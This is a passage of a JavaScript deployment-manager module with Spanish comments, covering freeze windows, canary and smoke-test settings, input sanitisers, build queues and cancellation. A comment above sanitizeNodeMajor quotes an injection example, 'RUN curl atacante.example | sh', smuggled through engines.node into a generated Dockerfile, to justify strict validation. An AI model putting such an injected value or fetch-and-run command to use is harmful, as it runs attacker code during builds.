    endMin = parseTimeToMinutes(win.endTime);
  }
  if (startMin === null || endMin === null) return false;

  const days = normalizeFreezeDays(win.days !== undefined ? win.days : win.daysOfWeek);
  if (days.size === 0) return false;

  if (startMin === endMin) {
    return days.has(zoned.dow);
  }
  if (startMin < endMin) {
    return days.has(zoned.dow) && zoned.minutes >= startMin && zoned.minutes < endMin;
  }
  // Ventana nocturna (p. ej. 22:00 -> 06:00): activa hoy >= startMin O ayer en `days` y hoy < endMin
  const prevDow = (zoned.dow + 6) % 7;
  return (days.has(zoned.dow) && zoned.minutes >= startMin) || (days.has(prevDow) && zoned.minutes < endMin);
}

/**
 * Evaluador puro compartido de ventanas de congelación (usado por `deployManager` y `environmentManager`).
 * JAMÁS bloquea operaciones de rollback (`rollback`, `auto-rollback`, `post-deploy-rollback`).
 *
 * @param {any} projectOrId
 * @param {Date | number | string | { now?: Date | number | string, trigger?: string, includeGlobal?: boolean }} [nowOrOpts]
 * @param {any[]} [globalWindows]
 * @returns {{ frozen: boolean, active: boolean, window: any | null, reason: string | null, evaluatedAt: string }}
 */
function evaluateFreezeStatus(projectOrId, nowOrOpts = {}, globalWindows = []) {
  let nowDate = new Date();
  let trigger = 'manual';
  let includeGlobal = true;
  if (nowOrOpts instanceof Date) {
    nowDate = nowOrOpts;
  } else if (typeof nowOrOpts === 'number' || typeof nowOrOpts === 'string') {
    nowDate = new Date(nowOrOpts);
  } else if (nowOrOpts && typeof nowOrOpts === 'object') {
    if (nowOrOpts.now !== undefined && nowOrOpts.now !== null) {
      nowDate = nowOrOpts.now instanceof Date ? nowOrOpts.now : new Date(nowOrOpts.now);
    }
    if (typeof nowOrOpts.trigger === 'string' && nowOrOpts.trigger) trigger = nowOrOpts.trigger;
    if (nowOrOpts.includeGlobal === false) includeGlobal = false;
  }
  if (Number.isNaN(nowDate.getTime())) nowDate = new Date();

  const evaluatedAt = nowDate.toISOString();
  if (trigger === 'rollback' || trigger === 'auto-rollback' || trigger === 'post-deploy-rollback') {
    return { frozen: false, active: false, window: null, reason: null, evaluatedAt };
  }

  let projectObj = (projectOrId && typeof projectOrId === 'object') ? projectOrId : null;
  const projectId = projectObj ? projectObj.id : (typeof projectOrId === 'string' ? projectOrId : null);
  if (!projectObj && projectId) {
    try {
      const pm = getProjectManager();
      if (pm && typeof pm.getById === 'function') projectObj = pm.getById(projectId);
    } catch (e) {}
  }

  /** @type {any[]} */
  const candidates = [];
  if (projectObj && Array.isArray(projectObj.freezeWindows)) {
    for (const w of projectObj.freezeWindows) {
      candidates.push({ ...w, scope: w.scope || 'project' });
    }
  }
  if (includeGlobal && Array.isArray(globalWindows)) {
    for (const gw of globalWindows) {
      if (!gw || typeof gw !== 'object') continue;
      if (gw.scope === 'project' && Array.isArray(gw.projectIds) && gw.projectIds.length > 0) {
        if (!projectId || !gw.projectIds.includes(projectId)) continue;
      }
      candidates.push({ ...gw, scope: gw.scope || 'global' });
    }
  }

  for (const win of candidates) {
    if (matchesFreezeWindow(win, nowDate, trigger)) {
      const reason = String(win.reason || win.name || 'Ventana de congelación de despliegues activa').trim();
      return { frozen: true, active: true, window: win, reason, evaluatedAt };
    }
  }
  return { frozen: false, active: false, window: null, reason: null, evaluatedAt };
}

/**
 * Helper booleano rápido: `true` si el proyecto está actualmente dentro de una ventana de congelación.
 * @param {any} project
 * @param {Date | number | string} [now]
 * @param {string} [trigger]
 * @param {any[]} [globalWindows]
 * @returns {boolean}
 */
function isInFreezeWindow(project, now = new Date(), trigger = 'manual', globalWindows = []) {
  return evaluateFreezeStatus(project, { now, trigger }, globalWindows).frozen;
}

/**
 * Normaliza la lista de smoke tests desde `options.smokeTests` o `project.smokeTests`.
 * Soporta tanto array compacto `[{ path, expectStatus, ... }]` como `{ enabled, failPolicy, checks }`.
 * @param {any} raw
 * @returns {{ enabled: boolean, failPolicy: 'abort' | 'rollback' | 'warn', checks: any[] }}
 */
function normalizeSmokeConfig(raw) {
  if (Array.isArray(raw)) {
    const checks = raw.filter((c) => c && typeof c === 'object').slice(0, 10);
    return { enabled: checks.length > 0, failPolicy: 'abort', checks };
  }
  if (raw && typeof raw === 'object' && Array.isArray(raw.checks)) {
    const checks = raw.checks.filter((c) => c && typeof c === 'object').slice(0, 10);
    /** @type {'abort' | 'rollback' | 'warn'} */
    const failPolicy = raw.failPolicy === 'rollback' || raw.failPolicy === 'warn' ? raw.failPolicy : 'abort';
    return { enabled: Boolean(raw.enabled) && checks.length > 0, failPolicy, checks };
  }
  return { enabled: false, failPolicy: 'abort', checks: [] };
}

/**
 * Normaliza la configuración de Canary Auto-Guard.
 * @param {any} raw
 */
function normalizeCanaryConfig(raw) {
  if (!raw || typeof raw !== 'object' || !raw.enabled) {
    return { enabled: false, steps: [], stepDurationMs: 30000, checksPerStep: 2, maxErrorRate: 0.05, maxLatencyMs: null, autoRollback: true, requireManualPromote: false };
  }
  const wpRaw = Number(raw.weightPercent);
  const weightPercent = Number.isFinite(wpRaw) && wpRaw >= 1 && wpRaw <= 99 ? Math.round(wpRaw) : 10;
  /** @type {number[]} */
  let steps = [];
  if (Array.isArray(raw.steps) && raw.steps.length > 0) {
    steps = raw.steps
      .map((s) => Math.round(Number(s)))
      .filter((n) => Number.isInteger(n) && n >= 1 && n <= 100);
  }
  if (steps.length === 0) steps = [weightPercent, 100];
  if (steps[steps.length - 1] !== 100) steps.push(100);

  const stepDurationMs = raw.stepDurationMs !== undefined && raw.stepDurationMs !== null && Number.isFinite(Number(raw.stepDurationMs))
    ? Math.min(300000, Math.max(10, Math.round(Number(raw.stepDurationMs))))
    : Math.min(300000, Math.max(10, Math.round((Number(raw.observeSeconds) || 30) * 1000)));
  const checksPerStep = Math.min(10, Math.max(1, Math.round(Number(raw.checksPerStep) || 2)));
  const errRaw = raw.maxErrorRate !== undefined && raw.maxErrorRate !== null ? Number(raw.maxErrorRate) : 0.05;
  const maxErrorRate = Number.isFinite(errRaw) && errRaw >= 0 && errRaw <= 1 ? errRaw : 0.05;
  const maxLatencyMs = raw.maxLatencyMs !== undefined && raw.maxLatencyMs !== null && Number.isFinite(Number(raw.maxLatencyMs))
    ? Math.min(60000, Math.max(1, Math.round(Number(raw.maxLatencyMs))))
    : null;

  return {
    enabled: true,
    weightPercent,
    steps,
    stepDurationMs,
    checksPerStep,
    maxErrorRate,
    maxLatencyMs,
    autoRollback: raw.autoRollback !== undefined ? Boolean(raw.autoRollback) : true,
    requireManualPromote: Boolean(raw.requireManualPromote)
  };
}

/**
 * Versión mayor de Node declarada en `engines`.
 *
 * Esto se escribe dentro de una línea `FROM` de un Dockerfile generado. Un
 * `engines.node` de `22-alpine\nRUN curl atacante.example | sh` sería ejecución
 * de código en el build si lo copiásemos tal cual. Solo se acepta un entero.
 */
function sanitizeNodeMajor(value) {
  const raw = String(value == null ? '' : value).trim();
  if (!raw) return null;
  const match = raw.match(/(\d{1,2})/);
  if (!match) return null;
  const major = parseInt(match[1], 10);
  if (major < 18 || major > 40) return null;
  // Node 18 alcanzó EOL: si pide `>=18` sin techo estricto, subir a 22 LTS (Railpack/Nixpacks)
  if (major === 18 && /^>=/.test(raw)) return '22';
  return String(major);
}

/** Puerto TCP válido. */
function sanitizePort(value, fallback) {
  const port = parseInt(value, 10);
  return Number.isInteger(port) && port > 0 && port < 65536 ? port : fallback;
}

/** Entero acotado seguro para parámetros de healthcheck/reintentos. */
function sanitizeBoundedInt(value, fallback, min, max) {
  if (value === undefined || value === null || value === '') return fallback;
  const n = Number(value);
  if (!Number.isFinite(n)) return fallback;
  const rounded = Math.round(n);
  if (rounded < min) return min;
  if (rounded > max) return max;
  return rounded;
}

/**
 * Normaliza y valida identificadores de secretos BuildKit (`--secret id=NAME,env=NAME`).
 * Rechaza cualquier nombre que no sea POSIX válido o que esté en `HOST_HIJACK_ENV_BLOCKLIST`.
 * Devuelve orden determinista deduplicado para preservar la caché de BuildKit.
 * @param {any} namesOrMap
 * @returns {string[]}
 */
function normalizeBuildSecretNames(namesOrMap) {
  const rawNames = Array.isArray(namesOrMap)
    ? namesOrMap
    : (namesOrMap && typeof namesOrMap === 'object' ? Object.keys(namesOrMap) : []);
  /** @type {Set<string>} */
  const out = new Set();
  for (const name of rawNames) {
    if (typeof name !== 'string') continue;
    if (!isValidEnvName(name)) continue;
    if (HOST_HIJACK_ENV_BLOCKLIST.has(name.toUpperCase())) continue;
    out.add(name);
  }
  return Array.from(out).sort();
}

/**
 * Valida una ruta relativa de workspace en monorepo (ej. `apps/web`, `packages/api`).
 * Rechaza traversal `..`, rutas absolutas, espacios y metacaracteres.
 * @param {any} raw
 * @returns {string | null}
 */
function sanitizeWorkspacePath(raw) {
  if (typeof raw !== 'string') return null;
  const cleaned = raw.trim().replace(/\\/g, '/').replace(/^\/+|\/+$/g, '');
  if (!cleaned || cleaned === '.' || cleaned.length > 200) return null;
  const parts = cleaned.split('/');
  if (parts.some((seg) => !seg || seg === '.' || seg === '..' || !/^[A-Za-z0-9._-]+$/.test(seg))) {
    return null;
  }
  return parts.join('/');
}

/** Valida un nombre de paquete npm/workspace (`@scope/pkg` o `pkg`) para `--filter`. */
function sanitizeWorkspacePackageName(raw) {
  if (typeof raw !== 'string') return null;
  const s = raw.trim();
  if (!s || s.length > 120) return null;
  if (!/^(?:@[a-z0-9._-]+\/)?[a-z0-9._-]+$/i.test(s)) return null;
  return s;
}

class DeployManager extends EventEmitter {
  constructor() {
    super();
    /** projectId -> Promise, para serializar despliegues del mismo proyecto. */
    this.locks = new Map();
    /** Metadatos de bloqueo (PID propietario + TTL) para auto-recuperar deadlocks tras crash/OOM. */
    /** @type {Map<string, { projectId: string, ownerId: string, pid: number, acquiredAt: number, expiresAt: number, ttlMs: number }>} */
    this._lockMeta = new Map();
    /** Directorio opcional de lockfiles en disco (aislable en pruebas). */
    /** @type {string | null} */
    this._lockDir = null;
    /**
     * projectId -> { project, options } pendiente de lanzar cuando termine el
     * despliegue en curso. Una sola plaza y gana el último: si llegan tres
     * pushes durante un build de cuatro minutos, lo que hay que desplegar
     * después es el ÚLTIMO commit, no los tres en fila.
     */
    this.pending = new Map();
    /** projectId -> Promise del drenaje en curso (las pruebas lo esperan). */
    this.drains = new Map();
    /** containerName -> { projectId, timer, resolve } para drenajes independientes por contenedor (evita fugas RAM). */
    this._drainTimers = new Map();
    /** Contenedores actualmente arrancando/verificando que jamás deben ser podados por un drenaje paralelo. */
    this.inFlightContainers = new Set();
    /** Proyectos olvidados durante un despliegue en curso (para abortar y limpiar sin dejar huérfanos). */
    this._abortedProjects = new Set();
    /** Operaciones activas por proyecto para cancelación limpia en cualquier fase previa a promoción. */
    /** @type {Map<string, { deploymentId: string, stage: string, controller: AbortController, children: Set<any>, containerName: string | null }>} */
    this._activeOps = new Map();
    /** Canarios activos en observación (projectId -> estado de tráfico y control de promoción/aborto). */
    /** @type {Map<string, any>} */
    this.activeCanaries = new Map();
    /** Gancho inyectable para el gestor de flota SSH (perezoso; jamás se carga cuando serverId === 'local'). */
    this._getFleetManager = () => getServerFleetManager();
    /** Caché perezosa de ventanas globales de congelación (`data/deploy-freeze.json`). */
    /** @type {any[] | null} */
    this._globalFreezeWindows = null;
    this._freezeStoreFile = FREEZE_STORE_FILE;
    /** Cooldown y circuit-breaker por contenedor para el watchdog de producción (evita spam y ping-pong A<->B). */
    /** @type {Map<string, { lastNotifiedAt: number, rolledBackPairs: Set<string> }>} */
    this._incidentCooldown = new Map();
    /** Contador global de streams SSE activos de logs de producción. */
    this._activeLogStreams = 0;
    /** Último timestamp de respaldo `.bak` de deployments.json. */
    this._lastBakAt = 0;
    /** Puertos reservados en vuelo entre findFreePort() y docker run (coordinado con portRegistry). */
    this._pendingPorts = new Set();
    /** Semáforo global de builds concurrentes para evitar OOM en VPS de 1–4 GB RAM. */
    this.maxConcurrentBuilds = defaultMaxConcurrentBuilds();
    this._activeBuilds = 0;
    /** @type {Array<{ projectId: string, deploymentId: string, resolve: (val?: any) => void, reject: (err: any) => void, queuedAt: number }>} */
    this._buildQueue = [];
    /** @type {any} */
    this.dockerProbe = null;
    this.dockerProbeAt = 0;
    this.dockerProbeTtlMs = 15000;
    /** Cachés TTL de 60 s para evitar spawns repetitivos de `hasBinary` y `ensureNetwork`. */
    this._binaryCache = new Map();
    this._networkCache = new Map();
    /** @type {Record<string, any>} */
    this.store = this.loadStore();
    portRegistry.registerProvider('deployManager', () => {
      /** @type {number[]} */
      const ports = [];
      for (const st of Object.values(this.store)) {
        if (st && st.current && st.current.hostPort && (!st.current.serverId || st.current.serverId === 'local')) {
          ports.push(Number(st.current.hostPort));
        }
        if (st && st.previous && st.previous.hostPort && (!st.previous.serverId || st.previous.serverId === 'local')) {
          ports.push(Number(st.previous.hostPort));
        }
      }
      return ports;
    });
  }

  /**
   * Adquiere una plaza en el semáforo global de construcción (soporta cancelación limpia sin fuga de slots).
   * @param {string} projectId
   * @param {string} deploymentId
   * @param {{ signal?: AbortSignal | null }} [options]
   */
  async acquireBuildSlot(projectId, deploymentId, { signal = null } = {}) {
    if (signal && signal.aborted) {
      const err = new Error('Despliegue cancelado antes de iniciar la construcción');
      /** @type {any} */ (err).code = 'DEPLOY_CANCELLED';
      throw err;
    }
    if (this._activeBuilds < this.maxConcurrentBuilds) {
      this._activeBuilds++;
      return { waited: false, position: 0 };
    }
    const position = this._buildQueue.length + 1;
    await new Promise((resolve, reject) => {
      /** @type {{ projectId: string, deploymentId: string, resolve: (val?: any) => void, reject: (err: any) => void, queuedAt: number }} */
      const entry = {
        projectId,
        deploymentId,
        resolve: () => {
          if (signal && onAbort) signal.removeEventListener('abort', onAbort);
          resolve(undefined);
        },
        reject: (err) => {
          if (signal && onAbort) signal.removeEventListener('abort', onAbort);
          reject(err);
        },
        queuedAt: Date.now()
      };
      const onAbort = () => {
        const idx = this._buildQueue.indexOf(entry);
        if (idx !== -1) {
          this._buildQueue.splice(idx, 1);
          const err = new Error('Despliegue cancelado mientras esperaba en cola');
          /** @type {any} */ (err).code = 'DEPLOY_CANCELLED';
          reject(err);
        }
      };
      if (signal) signal.addEventListener('abort', onAbort, { once: true });
      this._buildQueue.push(entry);
    });
    return { waited: true, position };
  }

  releaseBuildSlot() {
    if (this._buildQueue.length > 0) {
      const next = this._buildQueue.shift();
      if (next) next.resolve();
      return;
    }
    if (this._activeBuilds > 0) this._activeBuilds--;
  }

  getQueueStatus() {
    return {
      maxConcurrentBuilds: this.maxConcurrentBuilds,
      activeBuilds: this._activeBuilds,
      queuedBuilds: this._buildQueue.map((q, idx) => ({
        position: idx + 1,
        projectId: q.projectId,
        deploymentId: q.deploymentId,
        waitingMs: Date.now() - q.queuedAt
      })),
      inFlightProjects: Array.from(this.locks.keys()),
      pendingSuperseding: Array.from(this.pending.keys())
    };
  }

  // -------------------------------------------------------------------------
  // Persistencia (con respaldo .bak y recuperación de estados interrumpidos)
  // -------------------------------------------------------------------------

  loadStore() {
    let parsed = null;
    for (const candidate of [STORE_FILE, STORE_BAK_FILE]) {
      try {
        if (!fs.existsSync(candidate)) continue;
        const data = JSON.parse(fs.readFileSync(candidate, 'utf8'));
        if (data && typeof data === 'object' && !Array.isArray(data)) {
          parsed = data;
          break;
        }
      } catch (e) {
        console.error(`[DeployManager] No se pudo leer ${path.basename(candidate)}:`, e.message);
      }
    }
    if (!parsed) return {};

    // Reconciliar cualquier despliegue que quedó en estado no terminal por un reinicio/crash del daemon
    let repaired = false;
    const nowIso = new Date().toISOString();
    for (const st of Object.values(parsed)) {
      if (!st || !Array.isArray(st.history)) continue;
      for (const h of st.history) {
        if (h && NON_TERMINAL_STATUSES.has(h.status)) {
          h.status = 'interrumpido';
          h.error = h.error || 'Daemon reiniciado durante el despliegue';
          h.finishedAt = h.finishedAt || nowIso;
          repaired = true;
        }
      }
    }
    if (repaired) {
      try { atomicWriteJsonSync(STORE_FILE, parsed, 0o600); } catch (e) {}
    }
    return parsed;
  }

  /** Escritura atómica con permisos 0600 y copia de respaldo `.bak` (throttled cada 5 s). */
  saveStore() {
    try {
      const minFree = process.env.CULKIBO_MIN_FREE_BYTES != null
        ? Number(process.env.CULKIBO_MIN_FREE_BYTES)
        : STORE_MIN_DISK_FREE_BYTES;
      assertDiskHeadroom(path.dirname(STORE_FILE), minFree);
      const now = Date.now();
      if (now - this._lastBakAt >= 5000 && fs.existsSync(STORE_FILE)) {
        try { fs.copyFileSync(STORE_FILE, STORE_BAK_FILE); this._lastBakAt = now; } catch (e) {}
      }
      atomicWriteJsonSync(STORE_FILE, this.store, 0o600);
    } catch (e) {
      console.error('[DeployManager] No se pudo guardar deployments.json:', e.message);
    }
  }

  getState(projectId) {
    if (!this.store[projectId]) {
      this.store[projectId] = { current: null, previous: null, history: [] };
    }
    return this.store[projectId];
  }

  /** Historial de despliegues, el más reciente primero. */
  listDeployments(projectId, limit = 20) {
    return this.getState(projectId).history.slice(0, limit);
  }

  getDeployment(projectId, deploymentId) {
    return this.getState(projectId).history.find(d => d.id === deploymentId) || null;
  }

  /** Cancela el drenaje de un contenedor concreto (p. ej. al promocionarlo de vuelta en rollback). */
  cancelContainerDrain(containerName) {
    const entry = this._drainTimers.get(containerName);
    if (!entry) return;
    clearTimeout(entry.timer);
    this._drainTimers.delete(containerName);
    entry.resolve(true);
  }

  /** Cancela todos los drenajes pendientes de un proyecto (al parar, borrar o hacer rollback). */
  cancelDrain(projectId) {
    for (const [cName, entry] of Array.from(this._drainTimers.entries())) {
      if (entry.projectId === projectId) {
        clearTimeout(entry.timer);
        this._drainTimers.delete(cName);
        entry.resolve(true);
      }
    }
  }

  cancelAllDrains() {
    for (const cName of Array.from(this._drainTimers.keys())) {
      this.cancelContainerDrain(cName);
    }
  }

  /**
   * Detiene inmediatamente los contenedores en ventana de drenaje al apagar el daemon,
   * evitando que contenedores `--restart unless-stopped` queden vivos para siempre.
   * Si existe algún canario activo, restaura primero el 100% del tráfico a la versión estable.
   */
  async flushDrainsForShutdown({ timeoutMs = 3500 } = {}) {
    // Restaurar 100% tráfico estable para cualquier canario en curso antes de salir
    for (const [pid, canary] of Array.from(this.activeCanaries.entries())) {
      try {
        this.abortCanary(pid, { reason: 'Apagado del daemon' });
        if (canary && typeof canary.restoreStable === 'function') {
          await Promise.race([
            Promise.resolve(canary.restoreStable()).catch(() => {}),
            new Promise((r) => { const t = setTimeout(r, 1000); if (t.unref) t.unref(); })
          ]);
        }
      } catch (e) {}
    }
    // Cancelar builds / hooks pre-deploy en curso (nunca interrumpir la promoción atómica)
    for (const [pid, op] of Array.from(this._activeOps.entries())) {
      if (op && op.stage !== 'promocionando') {
        try { this.cancelDeploy(pid, { reason: 'Apagado del daemon' }); } catch (e) {}
      }
    }
    const retiring = [];
    for (const [cName, entry] of Array.from(this._drainTimers.entries())) {
      const st = this.store[entry.projectId];
      if (!st || !st.current || st.current.containerName !== cName) {
        retiring.push(cName);
      }
      clearTimeout(entry.timer);
      this._drainTimers.delete(cName);
      entry.resolve(true);
    }
    if (retiring.length === 0) return { stopped: [] };
    const stopTasks = retiring.map((name) =>
      this.runDocker(['stop', '--time', '3', name], { timeoutMs: Math.max(2000, timeoutMs) })
        .then((r) => (r.code === 0 ? name : null))
        .catch(() => null)
    );
    const results = await Promise.race([
      Promise.all(stopTasks),
      new Promise((resolve) => {
        const t = setTimeout(() => resolve([]), timeoutMs);
        if (t.unref) t.unref();
      })
    ]);
    return { stopped: Array.isArray(results) ? results.filter(Boolean) : [] };
  }

  /**
   * Cancela limpiamente un despliegue en cola o en curso antes de la promoción atómica.
   * Mata el proceso activo (git/docker build/pre-deploy) y libera cualquier plaza de cola.
   */
  cancelDeploy(projectId, { reason = 'Cancelado por el usuario' } = {}) {
    if (this.activeCanaries.has(projectId)) {
      this.abortCanary(projectId, { reason });
    }
    const op = this._activeOps.get(projectId);
    if (!op) {
      if (this.pending.has(projectId)) {
        this.pending.delete(projectId);
        return { cancelled: true, stage: 'pendiente', deploymentId: null, message: 'Despliegue encolado cancelado' };
      }
      return { cancelled: false, status: 404, error: 'No hay ningún despliegue en curso para este proyecto' };
    }
    if (op.stage === 'promocionando') {
      return {
        cancelled: false,
        status: 409,
        deploymentId: op.deploymentId,
        stage: op.stage,
        error: 'Promoción atómica en curso; espera 1 s y utiliza Rollback si necesitas volver atrás'
      };
    }
    this._abortedProjects.add(projectId);
    this.pending.delete(projectId);
    try { op.controller.abort(new Error(reason)); } catch (e) {}
    for (const child of Array.from(op.children)) {
      try { child.kill('SIGTERM'); } catch (e) {}
      const esc = setTimeout(() => {
        try { child.kill('SIGKILL'); } catch (e) {}
      }, 3000);
      if (esc.unref) esc.unref();
    }
    return {
      cancelled: true,
      deploymentId: op.deploymentId,
      stage: op.stage,
      message: `Cancelación solicitada en fase «${op.stage}»`
    };
  }

  /**
   * Olvida todo lo que sabemos de un proyecto borrado, cancela cualquier build en
   * vuelo y retira sus contenedores de producción sin dejar huérfanos.
   */
  forget(projectId) {
    this._abortedProjects.add(projectId);
    try { this.cancelDeploy(projectId, { reason: 'Proyecto eliminado durante el despliegue' }); } catch (e) {}
    this.cancelDrain(projectId);
    const prevState = this.store[projectId];
    const had = Boolean(prevState);
    delete this.store[projectId];
    this.pending.delete(projectId);
    if (had) {
      this.saveStore();
      const names = [prevState.current?.containerName, prevState.previous?.containerName].filter(Boolean);
      const targetServerId = prevState.current?.serverId || prevState.previous?.serverId || 'local';
      if (names.length > 0) {
        if (targetServerId && targetServerId !== 'local') {
          this._withRemoteDockerEnv(targetServerId, {}, async (remoteDockerHost, fleet) => {
            const env = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
            await Promise.allSettled([
              this._withRouteTarget(targetServerId, fleet, ({ adminUrl }) => caddyManager.removeRoute(projectId, { adminUrl })).catch(() => {}),
              ...names.map((n) => this.runDocker(['rm', '-f', n], { timeoutMs: 20000, env }).catch(() => {}))
            ]);
          }).catch(() => {});
        } else {
          Promise.allSettled([
            caddyManager.removeRoute(projectId).catch(() => {}),
            ...names.map((n) => this.runDocker(['rm', '-f', n], { timeoutMs: 20000 }).catch(() => {}))
          ]).catch(() => {});
        }
      }
    }
    return { removed: had };
  }

  // -------------------------------------------------------------------------
  // Auditoría, Ventanas de Congelación, Control de Canarios y Flota SSH
  // -------------------------------------------------------------------------

  /** @param {any} entry */
  _recordAudit(entry) {
    try {
      const al = getAuditLogger();
      if (al && typeof al.record === 'function') {
        al.record(entry);
      }
    } catch (e) {}
  }

  _loadGlobalFreezeWindows() {
    if (this._globalFreezeWindows !== null) return this._globalFreezeWindows;
    try {
      const loaded = loadJsonWithBackupSync(this._freezeStoreFile, {
        validate: (d) => Array.isArray(d)
      });
      this._globalFreezeWindows = loaded.ok && Array.isArray(loaded.data) ? loaded.data : [];
    } catch (e) {
      this._globalFreezeWindows = [];
    }
    return this._globalFreezeWindows;
  }

  _saveGlobalFreezeWindows() {
    try {
      atomicWriteJsonSync(this._freezeStoreFile, this._globalFreezeWindows || [], { mode: 0o600, backup: true });
    } catch (e) {}
  }

  listFreezeWindows() {
    return this._loadGlobalFreezeWindows().map((w) => ({ ...w }));
  }

  /** @param {any} win */
  addFreezeWindow(win) {
    if (!win || typeof win !== 'object' || Array.isArray(win)) {
      throw new Error('Ventana de congelación inválida');
    }
    const list = this._loadGlobalFreezeWindows();
    if (list.length >= 32) {
      throw new Error('Máximo de 32 ventanas globales de congelación alcanzado');
    }
    const tz = String(win.tz || win.timezone || 'UTC').trim() || 'UTC';
    try { new Intl.DateTimeFormat('en-US', { timeZone: tz }); } catch (e) {
      throw new Error(`Zona horaria IANA inválida: ${tz}`);
    }
    const isOnce = win.kind === 'once';
    if (isOnce) {
      const s = Date.parse(String(win.startAt || ''));
      const e = Date.parse(String(win.endAt || ''));
      if (!Number.isFinite(s) || !Number.isFinite(e) || e <= s) {
        throw new Error('Ventana puntual requiere startAt y endAt ISO válidos (endAt > startAt)');
      }
    } else if (win.startHour !== undefined || win.endHour !== undefined) {
      const sh = Number(win.startHour);
      const eh = Number(win.endHour);
      if (!Number.isInteger(sh) || sh < 0 || sh > 23 || !Number.isInteger(eh) || eh < 0 || eh > 24) {
        throw new Error('startHour (0..23) y endHour (0..24) inválidos en ventana de congelación');
      }
    } else if (typeof win.startTime === 'string' && typeof win.endTime === 'string') {
      if (parseTimeToMinutes(win.startTime) === null || parseTimeToMinutes(win.endTime) === null) {
        throw new Error('startTime y endTime deben tener formato HH:MM válido');
      }
    } else {
      throw new Error('La ventana de congelación requiere startHour/endHour, startTime/endTime o kind:"once" con startAt/endAt');
    }
    const entry = {
      id: `frz_${Date.now().toString(36)}_${crypto.randomBytes(3).toString('hex')}`,
      name: String(win.name || 'Ventana de congelación').replace(/[\x00-\x1f\x7f]/g, '').trim().slice(0, 80),
      enabled: win.enabled !== false,
      scope: win.scope === 'project' ? 'project' : 'global',
      projectIds: Array.isArray(win.projectIds) ? win.projectIds.map(String).slice(0, 64) : [],
      kind: win.kind === 'once' ? 'once' : 'recurring',
      ...(win.days !== undefined ? { days: Array.from(normalizeFreezeDays(win.days)) } : {}),
      ...(win.daysOfWeek !== undefined ? { daysOfWeek: Array.from(normalizeFreezeDays(win.daysOfWeek)) } : {}),
      ...(win.startHour !== undefined ? { startHour: Number(win.startHour) } : {}),
      ...(win.endHour !== undefined ? { endHour: Number(win.endHour) } : {}),
      ...(win.startTime ? { startTime: String(win.startTime).trim() } : {}),
      ...(win.endTime ? { endTime: String(win.endTime).trim() } : {}),
      ...(win.startAt ? { startAt: new Date(win.startAt).toISOString() } : {}),
      ...(win.endAt ? { endAt: new Date(win.endAt).toISOString() } : {}),
      tz,
      reason: String(win.reason || '').replace(/[\x00-\x1f\x7f]/g, '').trim().slice(0, 200),
      ...(Array.isArray(win.blockTriggers) ? { blockTriggers: win.blockTriggers.map(String).slice(0, 8) } : {})
    };
    list.push(entry);
    this._saveGlobalFreezeWindows();
    return { ...entry };
  }

  /** @param {string} id @param {any} patch */
  updateFreezeWindow(id, patch) {
    const list = this._loadGlobalFreezeWindows();
    const idx = list.findIndex((w) => w && w.id === id);
    if (idx === -1) return null;
    if (patch && (patch.tz || patch.timezone)) {
      const tz = String(patch.tz || patch.timezone).trim();
      new Intl.DateTimeFormat('en-US', { timeZone: tz });
    }
    list[idx] = { ...list[idx], ...patch, id };
    this._saveGlobalFreezeWindows();
    return { ...list[idx] };
  }

  /** @param {string} id */
  removeFreezeWindow(id) {
    const list = this._loadGlobalFreezeWindows();
    const before = list.length;
    this._globalFreezeWindows = list.filter((w) => w && w.id !== id);
    if (this._globalFreezeWindows.length !== before) {
      this._saveGlobalFreezeWindows();
      return { removed: true, id };
    }
    return { removed: false, id };
  }

  /**
   * Evalúa si un proyecto está bloqueado por una ventana de congelación (de proyecto o global).
   * @param {any} projectOrId
   * @param {Date | number | string | { now?: Date | number | string, trigger?: string, includeGlobal?: boolean }} [nowOrOpts]
   */
  evaluateFreezeStatus(projectOrId, nowOrOpts = {}) {
    return evaluateFreezeStatus(projectOrId, nowOrOpts, this._loadGlobalFreezeWindows());
  }

  /**
   * Devuelve `true` si el proyecto está en una ventana de congelación activa en `now`.
   * @param {any} project
   * @param {Date | number | string} [now]
   * @param {string} [trigger]
   */
  isInFreezeWindow(project, now = new Date(), trigger = 'manual') {
    return this.evaluateFreezeStatus(project, { now, trigger }).frozen;
  }

  /** Devuelve el estado de un canario en curso (para UI, API e `ingressManager.buildDesiredState()`). */
  getCanaryState(projectId) {
    const c = this.activeCanaries.get(projectId);
    if (!c) return null;
    return {
      projectId,
      deploymentId: c.deploymentId,
      stableDial: c.stableDial,
      canaryDial: c.canaryDial,
      stableContainer: c.stableContainer,
      canaryContainer: c.canaryContainer,
      weight: c.weight,
      stepIndex: c.stepIndex,
      steps: [...c.steps],
      startedAt: c.startedAt
    };
  }

  /** Promociona inmediatamente un canario activo al 100%. */
  promoteCanary(projectId) {
    const c = this.activeCanaries.get(projectId);
    if (!c) return { ok: false, status: 404, error: 'No hay ningún despliegue canario activo para este proyecto' };
    c.manualPromote = true;
    if (typeof c.wake === 'function') c.wake();
    return { ok: true, deploymentId: c.deploymentId, action: 'promote' };
  }

  /** Aborta inmediatamente un canario activo y solicita restauración al 100% de la versión estable. */
  abortCanary(projectId, { reason = 'Abortado manualmente' } = {}) {
    const c = this.activeCanaries.get(projectId);
    if (!c) return { ok: false, status: 404, error: 'No hay ningún despliegue canario activo para este proyecto' };
    c.aborted = true;
    c.abortReason = reason;
    if (typeof c.wake === 'function') c.wake();
    return { ok: true, deploymentId: c.deploymentId, action: 'abort', reason };
  }

  /**
   * Envuelve operaciones Docker en un túnel SSH ref-counted cuando `serverId !== 'local'`.
   * Para `serverId === 'local'`, jamás importa ni llama a `serverFleetManager` (coste 0).
   * @template T
   * @param {string} serverId
   * @param {{ signal?: AbortSignal | null }} opts
   * @param {(remoteDockerHost: string | null, fleet: any | null) => Promise<T>} fn
   * @returns {Promise<T>}
   */
  async _withRemoteDockerEnv(serverId, opts, fn) {
    const sid = String(serverId || 'local').trim() || 'local';
    if (sid === 'local') {
      return fn(null, null);
    }
    const fleet = typeof this._getFleetManager === 'function' ? this._getFleetManager() : getServerFleetManager();
    if (!fleet) {
      throw new Error(`Gestor de flota SSH no disponible para el servidor remoto «${sid}»`);
    }
    if (typeof fleet.acquireDockerTunnel === 'function') {
      const lease = await fleet.acquireDockerTunnel(sid, { signal: opts?.signal || null });
      const dh = typeof lease === 'string' ? lease : lease?.dockerHost;
      if (!dh) {
        if (lease && typeof lease.release === 'function') await Promise.resolve(lease.release()).catch(() => {});
        throw new Error(`No se obtuvo DOCKER_HOST del túnel para el servidor «${sid}»`);
      }
      try {
        return await fn(dh, fleet);
      } finally {
        if (lease && typeof lease.release === 'function') {
